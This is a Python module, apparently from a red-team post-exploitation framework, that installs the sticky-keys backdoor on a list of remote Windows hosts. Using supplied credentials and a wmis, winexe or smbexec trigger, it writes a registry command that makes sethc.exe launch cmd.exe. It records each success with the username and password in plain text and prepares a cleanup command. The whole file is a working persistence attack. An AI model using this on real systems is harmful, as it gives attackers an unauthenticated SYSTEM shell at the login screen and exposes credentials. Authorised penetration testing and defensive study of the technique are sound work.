"""

Add a sticky keys cmd.exe backdoor to a system.


Module built by @harmj0y

"""

from lib import command_methods


class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Stickykeys Backdoor"
        self.description = "Adds the sethc stickykeys backdoor on a host or host list."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"trigger_method" : ["wmis", "[wmis], [winexe], or [smbexec] for triggering"]}

    def run(self):

        # assume single set of credentials (take the first one)
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]

        for target in self.targets:

            # the registry command to set up the sethc stickkeys backdoor
            sethcCommand = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /f /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\""

            # execute the sethc command and get the result
            sethcResult = command_methods.executeResult(target, username, password, sethcCommand, triggerMethod)

            if sethcResult == "":
                self.output += "[!] No result file, SETHC backdoor enable failed using creds '"+username+":"+password+"' on : " + target + "\n"
            elif "The operation completed successfully" in sethcResult:
                self.output += "[*] SETHC backdoor successfully enabled using creds '"+username+":"+password+"' on : " + target + "\n"

                # build our cleanup -> deleting this registry run value
                cleanupCMD = "REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /f"
                self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+cleanupCMD+"|"+triggerMethod+"\n"

